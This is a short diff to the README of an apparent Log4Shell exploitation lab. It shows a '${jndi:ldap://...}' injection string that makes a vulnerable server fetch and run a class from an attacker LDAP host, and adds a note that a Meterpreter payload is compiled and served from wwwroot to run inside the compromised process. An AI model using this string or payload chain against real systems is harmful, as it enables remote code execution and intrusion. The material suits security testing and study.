@@ -38,6 +38,11 @@ as CMD \c "your command" on windows and /bin/sh -c "your command" on linux.
 To trigger the above command use the name of the class you created i.e : 
 '${jndi:ldap://10.20.30.40:1389/#TestCmd'
 
+The Payload.java file is the full Meterpreter file that is setup to run as a
+thread in the calling process that had the log4shell issue.  This needs to be 
+manuallyy compiled and moved to the wwwroot dir.  Additionally you need to have
+the metasploit.dat file setup with the properties you need.
+
 ## Clients
 The clients directory has 2 clients that can be executed.  One is a simple command
 line program that will write an error log for whatever the 1st param passed in is.
